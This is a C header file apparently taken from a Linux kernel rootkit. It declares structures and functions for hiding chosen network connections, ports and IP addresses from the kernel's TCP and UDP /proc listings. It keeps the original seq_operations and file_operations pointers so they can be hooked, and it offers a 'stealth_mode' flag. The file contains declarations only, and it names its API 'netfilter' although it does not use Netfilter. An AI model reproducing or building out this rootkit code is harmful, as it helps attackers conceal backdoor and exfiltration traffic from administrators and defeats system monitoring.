#ifndef NETWORK_HIDING_H
#define NETWORK_HIDING_H

#include <linux/types.h>
#include <linux/seq_file.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/inet.h>
#include <linux/net.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>

#define MAX_HIDDEN_CONNECTIONS 1024
#define MAX_HIDDEN_PORTS 65536
#define MAX_HIDDEN_IPS 256

typedef struct {
    uint32_t local_ip;
    uint32_t remote_ip;
    uint16_t local_port;
    uint16_t remote_port;
    uint8_t protocol;
    uint8_t enabled;
    uint64_t last_accessed;
} hidden_connection_t;

typedef struct {
    uint16_t ports[MAX_HIDDEN_PORTS];
    int port_count;
    uint32_t ips[MAX_HIDDEN_IPS];
    int ip_count;
    hidden_connection_t connections[MAX_HIDDEN_CONNECTIONS];
    int connection_count;
    int hide_all;
    int stealth_mode;
    int enabled;
} netfilter_config_t;

typedef struct {
    struct seq_operations *orig_tcp_seq_ops;
    struct seq_operations *orig_udp_seq_ops;
    struct file_operations *orig_tcp_fops;
    struct file_operations *orig_udp_fops;
    netfilter_config_t config;
    unsigned long tcp_seq_start;
    unsigned long tcp_seq_next;
    unsigned long tcp_seq_stop;
    unsigned long tcp_seq_show;
    unsigned long udp_seq_start;
    unsigned long udp_seq_next;
    unsigned long udp_seq_stop;
    unsigned long udp_seq_show;
} netfilter_ctx_t;

int netfilter_init(netfilter_ctx_t *ctx);
int netfilter_add_hidden_connection(netfilter_ctx_t *ctx, uint32_t local_ip, uint32_t remote_ip, uint16_t local_port, uint16_t remote_port, uint8_t protocol);
int netfilter_add_hidden_port(netfilter_ctx_t *ctx, uint16_t port);
int netfilter_add_hidden_ip(netfilter_ctx_t *ctx, uint32_t ip);
int netfilter_enable(netfilter_ctx_t *ctx);
int netfilter_disable(netfilter_ctx_t *ctx);
int netfilter_cleanup(netfilter_ctx_t *ctx);

#endif